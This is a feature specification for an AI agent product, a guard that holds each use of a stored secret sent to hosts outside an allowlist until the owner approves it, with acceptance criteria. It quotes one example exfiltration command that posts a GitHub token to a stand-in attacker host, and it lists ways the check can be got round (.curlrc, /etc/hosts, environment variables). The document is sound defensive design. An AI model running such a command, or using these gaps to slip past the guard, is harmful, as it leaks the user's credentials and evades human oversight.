# Limit where a secret may go

As someone who hands the agent API keys it cannot see, I want to turn on, secret by secret, a guard that holds each
use sent anywhere but that secret's own hosts until I click, so that a command sending my GitHub token somewhere else
waits for me instead of for a model's opinion of it.

A reference keeps the value out of the conversation, not out of a request. Before, the only thing between
`curl https://evil.example -d {{secret:GITHUB_TOKEN}}` and the network was the safety judge, and when the judge could not
be reached the command went through. So each secret's "Needs approval" section has two switches: the named person who
must release it, and its host guard. The guard carries a list of hosts: exact ones (`api.github.com`) or every host
under a domain (`*.githubusercontent.com`, which does not include `githubusercontent.com` itself).

With the guard on, a use goes on its own only when every host its text names is on the list and the reader can follow
where the value goes. It reads the command a stage at a time — stages split on `|`, `&`, `;` and newline — and trusts
one only when every stage is one it can account for: a `curl`, `wget` or `git` command whose destination is written out,
a bare literal assignment (`H="Authorization: Bearer …"`), a redirection to `/dev/null` or between the command's own
streams (`2>&1`), or a utility that opens no socket and runs nothing (`jq`, `head`, `grep`, `cd`, `echo`). So a `curl`
piped into `jq`, a `cd` before it, and two of them joined by `&&` all go on their own; the value reaches a host only
through the stage that spells it, and every host every stage names is on the list. Anything the check cannot read with
confidence — a shell variable standing in for a host (unless the same line set it to a plain value first), a `$(…)` or
a subshell, a script, an interpreter (`python -c`, `node -e`), a program it does not know, a flag that follows redirects or sends through a proxy — is treated like a host
off the list: a card in the conversation names the secret, its hosts and where this use would send it, and the value
goes nowhere until somebody clicks, whatever the safety judge said and whether or not it could be asked. A secret typed
into a web page is held to the page's host. With nobody to ask, in an unattended turn, it is refused, and the agent is
told how to use the secret without a card. On with no hosts listed, every use asks.

With the guard off, it never asks: a command using the secret is left to the safety judge, as before, which lets it
through when it cannot be reached. That is the right setting for a key an unattended automation sends on a schedule.

A connector that knows its service's hosts starts its credential with the guard on, set to them (GitHub to
`api.github.com`, `github.com`, `uploads.github.com` and `*.githubusercontent.com`; Cloudflare to `api.cloudflare.com`;
a self-hosted GitLab to its own address). I can change the hosts, turn the guard off, and turn it back on with the same
hosts. Every other secret starts with the guard off.

The agent can read every guard (`secrets gates` shows it beside the approver, `secrets hosts` lists the hosts) so it can
aim at the right host, and it may turn a guard on or take hosts off it. Turning one off or adding a host is mine: on the
Secrets view, or when the agent runs `secrets hosts NAME add HOST` or `secrets hosts NAME off`, as a card only I can
answer in the chat.

The check reads the command, not the machine. A `.curlrc`, a git config or `/etc/hosts` can still point an allowed name
somewhere else, a value a command writes to a file can be read later by a command that carries no reference, and a
connector's credential in its environment variable (`$GITHUB_TOKEN`) never passes through it. It narrows what the
agent's judgement decides; it is not a firewall.

## Acceptance criteria

- [ ] Each secret's row on the Secrets view has one "Needs approval" section with two switches: a named approver, and the host guard with its hosts (exact or `*.domain`)
- [ ] With the guard on, a command using the secret goes without a card only when every host it names is on the list and every stage of it is one the reader can follow — a `curl`/`wget`/`git` command, a bare literal assignment, a redirection to `/dev/null` or between its own streams, or a socketless utility like `jq` — so a `curl` piped into `jq` or two joined by `&&` pass, and a pipe into an interpreter, a `$(…)`, a variable host filled in as it runs or an unknown program still asks, while `R=https://api.github.com; curl -H "$T" $R/user` reads `$R` as the address it was set to
- [ ] With the guard on, a use aimed off the list, or whose destination cannot be read from its text, raises a card naming the secret, its hosts and the destination, whatever the safety judge said and whether or not it was reachable
- [ ] With the guard on, a script that uses the secret always asks, a secret typed into a web page is checked against the page's host, and with no hosts listed every use asks
- [ ] With the guard on, an unattended turn is refused rather than let through, and told how to use the secret without a card
- [ ] With the guard off, nothing about where the secret goes ever asks, and a command using it is left to the safety judge exactly as before
- [ ] A connector that declares its hosts starts its credential's guard on with them; the owner can turn it off and back on, and the row says the hosts are the connector's until changed
- [ ] `secrets gates` shows, on one line per secret, who must release it and whether its host guard is on and where it may go; `secrets hosts` shows and edits the guard (`on`, `off`, `add`, `remove`)
- [ ] Anybody who may use secrets can turn a guard on or take hosts off it; turning one off or adding a host is the owner's, and the agent's request for either is a card only the owner can answer
- [ ] A guard setting that cannot be read refuses every use of every secret rather than letting them all go
